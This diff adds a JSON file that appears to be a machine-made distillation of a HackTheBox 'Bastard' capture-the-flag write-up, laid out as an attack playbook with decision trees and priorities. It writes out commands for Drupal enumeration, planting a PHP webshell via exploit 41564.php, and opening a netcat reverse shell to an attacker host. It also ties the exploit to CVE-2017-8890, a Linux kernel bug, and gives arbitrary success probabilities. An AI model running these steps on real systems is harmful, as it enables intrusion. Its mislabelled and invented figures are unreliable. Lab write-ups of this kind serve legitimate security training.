@@ -1,0 +1,836 @@
+{
+  "writeup_id": "Htb_Bastard",
+  "scenario_fingerprint": {
+    "scenario_name": "windows_drupal_cms_exploitation",
+    "primary_services": [
+      "http",
+      "msrpc"
+    ],
+    "port_signature": "80+135+49154",
+    "service_combination": "iis+drupal+msrpc",
+    "os_family": "windows_server",
+    "environment_type": "web_server",
+    "entry_vector": "drupal_vulnerability",
+    "privilege_path": "web_service_to_kernel_exploit",
+    "attack_complexity": "medium",
+    "estimated_time": "30-45 minutes",
+    "scenario_confidence": 0.92,
+    "distinguishing_factors": [
+      "drupal_7_54_version",
+      "iis_7_5_server",
+      "unpatched_windows_kernel",
+      "drupalgeddon_vulnerabilities"
+    ],
+    "environmental_clues": [
+      "microsoft_iis_httpd_7_5",
+      "drupal_changelog_accessible",
+      "robots_txt_disclosure",
+      "windows_server_2008r2"
+    ],
+    "similar_scenarios": [
+      "drupal_cms_boxes",
+      "windows_web_server_exploits"
+    ],
+    "unique_aspects": [
+      "multiple_drupalgeddon_vectors",
+      "services_module_rce",
+      "kernel_privilege_escalation"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "Drupal Services Module RCE",
+        "success_reason": "Drupal 7.54 with vulnerable Services module enabled and REST endpoint exposed",
+        "prerequisite_indicators": [
+          "drupal_7x_detected",
+          "services_module_installed",
+          "rest_endpoint_accessible",
+          "unpatched_drupal_version"
+        ],
+        "recognition_patterns": [
+          "CHANGELOG.txt reveals version 7.54",
+          "droopescan identifies services module",
+          "REST endpoint enumeration successful",
+          "services module in /sites/all/modules/"
+        ],
+        "failure_modes": [
+          "services_module_not_installed",
+          "rest_endpoint_disabled",
+          "drupal_version_patched",
+          "module_properly_configured"
+        ],
+        "environmental_factors": [
+          "default_drupal_installation",
+          "services_module_misconfiguration",
+          "insufficient_input_validation",
+          "legacy_web_application"
+        ],
+        "success_probability": 0.92,
+        "typical_timeframe": "15-30 minutes"
+      },
+      {
+        "technique": "Drupalgeddon2 RCE",
+        "success_reason": "Drupal core vulnerability in form API allowing unauthenticated RCE",
+        "prerequisite_indicators": [
+          "drupal_version_below_7.58",
+          "form_api_accessible",
+          "no_authentication_required"
+        ],
+        "recognition_patterns": [
+          "Drupal version < 7.58",
+          "form submission endpoints available",
+          "CVE-2018-7600 conditions met"
+        ],
+        "failure_modes": [
+          "drupal_version_patched",
+          "form_api_hardened",
+          "web_application_firewall"
+        ],
+        "environmental_factors": [
+          "unpatched_drupal_core",
+          "default_form_configurations",
+          "no_security_hardening"
+        ],
+        "success_probability": 0.95,
+        "typical_timeframe": "5-10 minutes"
+      },
+      {
+        "technique": "Windows Kernel Exploit Privilege Escalation",
+        "success_reason": "Unpatched Windows Server 2008 R2 vulnerable to multiple kernel exploits",
+        "prerequisite_indicators": [
+          "windows_server_2008_r2",
+          "missing_security_patches",
+          "iis_7.5_detected",
+          "kernel_exploit_conditions_met"
+        ],
+        "recognition_patterns": [
+          "IIS 7.5 indicates Server 2008 R2",
+          "systeminfo shows missing patches",
+          "kernel exploit enumeration successful"
+        ],
+        "failure_modes": [
+          "system_fully_patched",
+          "exploit_mitigation_enabled",
+          "antivirus_blocking_exploits"
+        ],
+        "environmental_factors": [
+          "legacy_windows_server",
+          "poor_patch_management",
+          "default_security_settings"
+        ],
+        "success_probability": 0.88,
+        "typical_timeframe": "10-20 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "Drupal 7.54 with Services module",
+        "discovery_method": "CHANGELOG.txt analysis and droopescan enumeration",
+        "why_critical": "Vulnerable version with exploitable module providing direct RCE path",
+        "how_to_recognize": [
+          "CHANGELOG.txt accessible via robots.txt",
+          "droopescan identifies services module",
+          "version falls within vulnerable range"
+        ],
+        "follow_up_actions": [
+          "enumerate_rest_endpoints",
+          "test_services_module_exploit",
+          "prepare_reverse_shell_payload"
+        ]
+      },
+      {
+        "discovery": "IIS 7.5 indicating Windows Server 2008 R2",
+        "discovery_method": "nmap service detection and HTTP headers",
+        "why_critical": "Identifies likely unpatched legacy Windows system vulnerable to kernel exploits",
+        "how_to_recognize": [
+          "IIS version 7.5 in HTTP headers",
+          "Windows RPC services on ports 135/49154",
+          "legacy system indicators"
+        ],
+        "follow_up_actions": [
+          "enumerate_system_patches",
+          "identify_kernel_exploit_candidates",
+          "test_privilege_escalation_vectors"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "iusr_web_service_account",
+        "escalation_method": "kernel_exploit_privilege_escalation",
+        "why_possible": "Unpatched Windows Server 2008 R2 vulnerable to multiple kernel exploits",
+        "recognition_signs": [
+          "systeminfo_shows_missing_patches",
+          "legacy_windows_version",
+          "no_exploit_mitigation_enabled"
+        ],
+        "exploitation_path": "Web RCE → iusr shell → kernel exploit → SYSTEM"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found ports 80,135,49154 open on Windows host with IIS 7.5 and Drupal 7",
+        "decision": "Identify Drupal version and enumerate modules for known vulnerabilities",
+        "reasoning": "Drupal has history of critical RCE vulnerabilities, version identification crucial",
+        "confidence": 0.95,
+        "alternatives": [
+          {
+            "option": "msrpc_enumeration",
+            "when": "if drupal enumeration fails"
+          },
+          {
+            "option": "directory_bruteforce",
+            "when": "if version detection fails"
+          }
+        ],
+        "success_indicators": [
+          "drupal_version_identified",
+          "changelog_accessible",
+          "modules_enumerated"
+        ],
+        "next_decision": "match_version_to_exploits"
+      },
+      {
+        "step": 2,
+        "situation": "Confirmed Drupal 7.54 with Services module installed",
+        "decision": "Use Services module RCE exploit (CVE-2017-8890) as primary attack",
+        "reasoning": "Services module RCE matches timeline and version, high success probability",
+        "confidence": 0.9,
+        "prerequisites": [
+          "drupal_version_7.x",
+          "services_module_present",
+          "rest_endpoint_accessible"
+        ],
+        "success_indicators": [
+          "rest_endpoint_responds",
+          "file_upload_successful"
+        ],
+        "failure_fallbacks": [
+          "drupalgeddon2",
+          "drupalgeddon3",
+          "credential_bruteforce"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Successfully uploaded webshell via Services module exploit",
+        "decision": "Establish reverse shell and enumerate system for privilege escalation",
+        "reasoning": "Web shell provides limited functionality, need proper shell for privesc",
+        "confidence": 0.85,
+        "prerequisites": [
+          "webshell_accessible",
+          "command_execution_confirmed"
+        ],
+        "success_indicators": [
+          "reverse_shell_established",
+          "system_info_gathered"
+        ],
+        "failure_fallbacks": [
+          "use_webshell_only",
+          "try_different_payload"
+        ]
+      }
+    ],
+    "branching_logic": {
+      "if_drupal_version_old": {
+        "action": "check_services_module_first",
+        "tools": [
+          "droopescan",
+          "dirsearch",
+          "curl"
+        ],
+        "next_phase": "services_module_exploitation"
+      },
+      "if_services_module_present": {
+        "action": "exploit_services_rce",
+        "tools": [
+          "custom_php_exploit",
+          "curl"
+        ],
+        "payload": "php_webshell_upload"
+      },
+      "if_webshell_successful": {
+        "action": "upgrade_to_reverse_shell",
+        "purpose": "enable_privilege_escalation_enumeration",
+        "tools": [
+          "nc",
+          "powershell",
+          "systeminfo"
+        ]
+      },
+      "if_windows_unpatched": {
+        "action": "kernel_exploit_enumeration",
+        "purpose": "identify_privilege_escalation_path",
+        "tools": [
+          "windows-exploit-suggester",
+          "sherlock"
+        ]
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_check_changelog_txt_for_drupal_version",
+        "reasoning": "reliable_version_identification_method",
+        "applicability": "drupal_cms_detected"
+      },
+      {
+        "rule": "prioritize_services_module_rce_on_drupal_7x",
+        "reasoning": "high_success_rate_and_reliable_exploitation",
+        "applicability": "drupal_7_with_services_module"
+      },
+      {
+        "rule": "enumerate_rest_endpoint_when_services_detected",
+        "reasoning": "required_for_services_module_exploitation",
+        "applicability": "services_module_present"
+      },
+      {
+        "rule": "upgrade_webshell_to_reverse_shell_immediately",
+        "reasoning": "better_enumeration_and_privesc_capabilities",
+        "applicability": "webshell_access_obtained"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "Drupal Services Module RCE",
+        "mitre_id": "T1190",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "windows",
+          "linux"
+        ],
+        "environmental_prerequisites": [
+          "drupal_cms_detected",
+          "services_module_enabled",
+          "vulnerable_drupal_version"
+        ],
+        "success_indicators": [
+          "services_module_endpoint_accessible",
+          "changelog_txt_readable",
+          "rest_api_responds"
+        ],
+        "incompatible_with": [
+          "services_module_disabled",
+          "patched_drupal_version",
+          "web_application_firewall"
+        ],
+        "confidence_boosters": [
+          "drupal_generator_meta_tag",
+          "robots_txt_drupal_paths",
+          "default_drupal_directory_structure"
+        ],
+        "typical_success_rate": 0.85,
+        "estimated_time": "10-20 minutes"
+      },
+      {
+        "technique": "Drupalgeddon2",
+        "mitre_id": "T1190",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "windows",
+          "linux"
+        ],
+        "environmental_prerequisites": [
+          "drupal_cms_detected",
+          "drupal_version_below_7_58",
+          "form_api_accessible"
+        ],
+        "success_indicators": [
+          "drupal_bootstrap_accessible",
+          "form_submission_allowed",
+          "php_execution_possible"
+        ],
+        "incompatible_with": [
+          "drupal_version_7_58_or_higher",
+          "form_api_disabled",
+          "php_execution_restricted"
+        ],
+        "confidence_boosters": [
+          "default_drupal_installation",
+          "unpatched_system",
+          "changelog_shows_vulnerable_version"
+        ],
+        "typical_success_rate": 0.92,
+        "estimated_time": "5-15 minutes"
+      },
+      {
+        "technique": "Windows Kernel Privilege Escalation",
+        "mitre_id": "T1068",
+        "required_services": [],
+        "required_ports": [],
+        "os_requirements": [
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "windows_system_detected",
+          "unpatched_kernel",
+          "low_privilege_shell_obtained"
+        ],
+        "success_indicators": [
+          "systeminfo_shows_old_version",
+          "missing_security_patches",
+          "kernel_exploit_compiles"
+        ],
+        "incompatible_with": [
+          "fully_patched_system",
+          "kernel_exploit_mitigations",
+          "restricted_execution_environment"
+        ],
+        "confidence_boosters": [
+          "windows_7_or_server_2008",
+          "early_htb_box_characteristics",
+          "iis_7_5_detected"
+        ],
+        "typical_success_rate": 0.78,
+        "estimated_time": "15-30 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "drupal_cms": {
+        "port_indicators": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "banner_indicators": [
+          "Drupal",
+          "generator: Drupal"
+        ],
+        "path_indicators": [
+          "/CHANGELOG.txt",
+          "/robots.txt",
+          "/user/login",
+          "/modules/",
+          "/themes/"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "windows_iis": {
+        "port_indicators": [
+          80,
+          443,
+          135,
+          49154
+        ],
+        "service_indicators": [
+          "http",
+          "msrpc"
+        ],
+        "banner_indicators": [
+          "Microsoft-IIS",
+          "Windows RPC"
+        ],
+        "confidence_threshold": 0.85
+      },
+      "legacy_windows": {
+        "port_indicators": [
+          135,
+          445
+        ],
+        "service_indicators": [
+          "msrpc",
+          "smb"
+        ],
+        "banner_indicators": [
+          "IIS/7.5",
+          "Windows Server 2008",
+          "Windows 7"
+        ],
+        "confidence_threshold": 0.8
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "drupalgeddon2",
+          "when": "drupal_detected_and_version_below_7_58",
+          "reason": "unauthenticated_rce_high_success_rate"
+        },
+        {
+          "attack": "drupal_services_rce",
+          "when": "drupal_services_module_detected",
+          "reason": "reliable_rce_through_rest_api"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "windows_kernel_exploit",
+          "when": "windows_shell_obtained_and_old_version",
+          "reason": "reliable_privesc_on_unpatched_systems"
+        },
+        {
+          "attack": "drupal_enumeration",
+          "when": "drupal_detected",
+          "reason": "reveals_modules_and_attack_surface"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "Drupal Services Module RCE",
+        "mitre_id": "T1190",
+        "category": "initial_access",
+        "phase": "exploitation",
+        "tools_used": [
+          {
+            "name": "Custom PHP Exploit",
+            "command_template": "php {exploit_file}",
+            "actual_command": "php 41564.php",
+            "output_pattern": "File written: http://{target}/{webshell}",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          },
+          {
+            "name": "curl",
+            "command_template": "curl http://{target}/{webshell}?cmd={command}",
+            "actual_command": "curl http://10.10.10.9/0xdf.php?cmd=whoami",
+            "output_pattern": "nt authority\\iusr",
+            "effectiveness_rating": 5,
+            "reliability": 0.98
+          }
+        ],
+        "prerequisites": [
+          "drupal_7.x_services_module_enabled",
+          "rest_endpoint_accessible",
+          "php_curl_installed"
+        ],
+        "success_indicators": [
+          "session_json_created",
+          "user_json_created",
+          "webshell_uploaded_successfully",
+          "command_execution_confirmed"
+        ],
+        "common_failures": [
+          "services_module_not_enabled",
+          "rest_endpoint_not_found",
+          "php_curl_missing"
+        ],
+        "follow_up_techniques": [
+          "webshell_to_reverse_shell",
+          "privilege_escalation",
+          "credential_harvesting"
+        ],
+        "time_investment": "10-20 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "Webshell to Reverse Shell",
+        "mitre_id": "T1059.003",
+        "category": "execution",
+        "phase": "post_exploitation",
+        "tools_used": [
+          {
+            "name": "netcat",
+            "command_template": "\\\\{attacker_ip}\\share\\nc64.exe -e cmd.exe {attacker_ip} {port}",
+            "actual_command": "\\\\10.10.14.14\\share\\nc64.exe -e cmd.exe 10.10.14.14 443",
+            "output_pattern": "Microsoft Windows [Version 6.1.7600]",
+            "effectiveness_rating": 5,
+            "reliability": 0.92
+          },
+          {
+            "name": "smbserver",
+            "command_template": "smbserver.py share {directory}",
+            "actual_command": "smbserver.py share /opt/tools/",
+            "success_factors": [
+              "smb_accessible",
+              "nc64_available"
+            ],
+            "effectiveness_rating": 4
+          }
+        ],
+        "prerequisites": [
+          "webshell_access",
+          "smb_connectivity",
+          "netcat_binary_available"
+        ],
+        "success_indicators": [
+          "reverse_shell_established",
+          "interactive_command_prompt",
+          "file_system_access"
+        ],
+        "common_failures": [
+          "smb_blocked_by_firewall",
+          "antivirus_detection",
+          "network_connectivity_issues"
+        ],
+        "follow_up_techniques": [
+          "system_enumeration",
+          "privilege_escalation",
+          "persistence"
+        ],
+        "time_investment": "5-10 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "Drupal Version Enumeration",
+        "mitre_id": "T1592.002",
+        "category": "reconnaissance",
+        "phase": "reconnaissance",
+        "tools_used": [
+          {
+            "name": "curl",
+            "command_template": "curl -s http://{target}/CHANGELOG.txt | head",
+            "actual_command": "curl -s http://10.10.10.9/CHANGELOG.txt | head",
+            "output_pattern": "Drupal 7.54, 2017-02-01",
+            "effectiveness_rating": 5,
+            "reliability": 0.99
+          },
+          {
+            "name": "droopescan",
+            "command_template": "/opt/droopescan/droopescan scan drupal -u http://{target}",
+            "actual_command": "/opt/droopescan/droopescan scan drupal -u http://10.10.10.9",
+            "success_factors": [
+              "changelog_accessible",
+              "modules_enumerable"
+            ],
+            "effectiveness_rating": 4
+          }
+        ],
+        "prerequisites": [
+          "web_service_accessible",
+          "drupal_installation_detected"
+        ],
+        "success_indicators": [
+          "version_identified",
+          "modules_enumerated",
+          "themes_discovered"
+        ],
+        "common_failures": [
+          "changelog_not_accessible",
+          "version_obfuscated",
+          "scan_timeout"
+        ],
+        "follow_up_techniques": [
+          "vulnerability_research",
+          "exploit_selection",
+          "module_specific_attacks"
+        ],
+        "time_investment": "5-45 minutes",
+        "skill_level": "beginner"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "droopescan",
+        "use_case": "drupal_enumeration",
+        "effectiveness_rating": 4,
+        "reliability": 0.85,
+        "learning_curve": "low",
+        "essential_for": [
+          "drupal_assessments"
+        ],
+        "alternatives": [
+          "manual_enumeration",
+          "wpscan"
+        ],
+        "best_practices": [
+          "allow_sufficient_time_for_scan",
+          "verify_findings_manually",
+          "check_changelog_first"
+        ]
+      },
+      {
+        "tool": "dirsearch",
+        "use_case": "web_directory_enumeration",
+        "effectiveness_rating": 4,
+        "reliability": 0.88,
+        "learning_curve": "low",
+        "essential_for": [
+          "web_application_testing"
+        ],
+        "alternatives": [
+          "gobuster",
+          "dirb",
+          "ffuf"
+        ],
+        "best_practices": [
+          "use_appropriate_extensions",
+          "filter_error_codes",
+          "adjust_thread_count_for_stability"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "drupal_services_exploitation",
+        "steps": [
+          {
+            "step": 1,
+            "command": "curl -s http://10.10.10.9/CHANGELOG.txt | head",
+            "purpose": "Identify Drupal version",
+            "expected_output": "Drupal 7.54, 2017-02-01"
+          },
+          {
+            "step": 2,
+            "command": "python3 /opt/dirsearch/dirsearch.py -u http://10.10.10.9/ -e php -x 403,404 -t 50",
+            "purpose": "Find REST endpoint",
+            "expected_output": "200 - 62B - /rest/"
+          },
+          {
+            "step": 3,
+            "command": "curl http://10.10.10.9/rest",
+            "purpose": "Confirm services endpoint",
+            "expected_output": "Services Endpoint \"rest_endpoint\" has been setup successfully"
+          },
+          {
+            "step": 4,
+            "command": "php 41564.php",
+            "purpose": "Execute services module exploit",
+            "expected_output": "File written: http://10.10.10.9/0xdf.php"
+          },
+          {
+            "step": 5,
+            "command": "curl http://10.10.10.9/0xdf.php?cmd=whoami",
+            "purpose": "Test webshell functionality",
+            "expected_output": "nt authority\\iusr"
+          }
+        ],
+        "success_rate": 0.92,
+        "typical_duration": "15-30 minutes"
+      },
+      {
+        "sequence_name": "webshell_to_reverse_shell",
+        "steps": [
+          {
+            "step": 1,
+            "command": "smbserver.py share /opt/tools/",
+            "purpose": "Host netcat binary via SMB",
+            "expected_output": "Impacket SMB server started"
+          },
+          {
+            "step": 2,
+            "command": "rlwrap nc -lnvp 443",
+            "purpose": "Setup reverse shell listener",
+            "expected_output": "Ncat: Listening on 0.0.0.0:443"
+          },
+          {
+            "step": 3,
+            "command": "curl 'http://10.10.10.9/0xdf.php?cmd=\\\\10.10.14.14\\share\\nc64.exe%20-e%20cmd.exe%2010.10.14.14%20443'",
+            "purpose": "Execute reverse shell payload",
+            "expected_output": "Connection established"
+          }
+        ],
+        "success_rate": 0.88,
+        "typical_duration": "5-10 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Bastard",
+      "difficulty": "Medium",
+      "os": "Windows",
+      "platform": "HackTheBox",
+      "release_date": "2017-03-18",
+      "author": "ch4p",
+      "estimated_time": "60-90 minutes"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "low",
+      "skill_level_required": "intermediate",
+      "primary_attack_vectors": [
+        "web_application",
+        "kernel_exploit"
+      ],
+      "key_vulnerabilities": [
+        "drupal_rce",
+        "unpatched_kernel"
+      ],
+      "environment_type": "web_server_windows",
+      "real_world_relevance": "high",
+      "learning_value": [
+        "cms_exploitation",
+        "drupal_vulnerabilities",
+        "windows_kernel_exploits"
+      ],
+      "prerequisite_knowledge": [
+        "web_application_security",
+        "cms_fundamentals",
+        "windows_privilege_escalation"
+      ]
+    },
+    "categorization": {
+      "primary_category": "web_application",
+      "subcategories": [
+        "cms_exploitation",
+        "kernel_exploitation"
+      ],
+      "attack_types": [
+        "remote_code_execution",
+        "privilege_escalation"
+      ],
+      "defensive_lessons": [
+        "patch_management",
+        "cms_hardening",
+        "kernel_updates"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Grandpa",
+        "Granny",
+        "Devel"
+      ],
+      "similarity_reasons": [
+        "windows_kernel_exploits",
+        "unpatched_systems",
+        "iis_server"
+      ],
+      "unique_aspects": [
+        "drupal_cms",
+        "multiple_drupalgeddon_exploits",
+        "drupal7_specific"
+      ],
+      "difficulty_factors": [
+        "straightforward_exploit_chain",
+        "well_known_vulnerabilities",
+        "multiple_attack_paths"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-04T12:04:20.192062",
+    "original_file": "0xdf_writeups/Htb Bastard.md",
+    "content_length": 29066,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 1.0,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 1.0,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
